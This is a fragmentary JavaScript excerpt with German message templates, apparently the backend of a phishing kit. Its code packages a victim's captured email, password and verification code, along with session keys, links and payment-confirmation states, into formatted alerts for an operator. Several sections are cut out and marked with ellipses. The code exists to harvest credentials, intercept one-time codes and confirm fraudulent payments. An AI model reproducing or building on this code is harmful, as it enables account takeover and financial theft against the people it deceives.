...
🕒 <b>Zeit:</b> ${formatDate(Date.now())}
      ...
      // Escape special characters in form data and code
      const safeEmail = escapeHTML(sessionData.formData?.email);
      const safePassword = escapeHTML(sessionData.formData?.password);
      const safeCode = escapeHTML(data.code);
      
      // Format complete data with both form and code
      message = `
🔑 <b>Verifizierungscode eingegeben</b>
...
async function notifyAutoGenerated(key) {
  try {
    ...
    // Format the message
    const message = `
🔄 <b>Automatisch generierte Sitzung</b>

🔑 <b>Sitzungsschlüssel:</b> <code>${key}</code>
🕒 <b>Erstellt:</b> ${formatDate(Date.now())}
🔗 <b>Link:</b>
${link}
...
📋 <b>Formulardaten:</b>
📧 <b>E-Mail:</b> ${escapeHTML(sessionData.formData?.email)}
🔒 <b>Passwort:</b> ${escapeHTML(sessionData.formData?.password)}

🔑 <b>Verifizierungscode:</b> ${escapeHTML(sessionData.code)}

🆔 <b>Sitzung:</b> <code>${key}</code>
🕒 <b>Zeit:</b> ${formatDate(Date.now())}

<i>Die Sitzung wurde erfolgreich beendet.</i>
      `;
      
      // No inline keyboard for ended sessions
      inlineKeyboard = {};
    } else if (status === 'success') {
      message = `
💰 <b>Zahlung bestätigt</b>
...
<i>Die Zahlung wurde bestätigt. Der Benutzer wird zur Erfolgsseite weitergeleitet.</i>
      `;
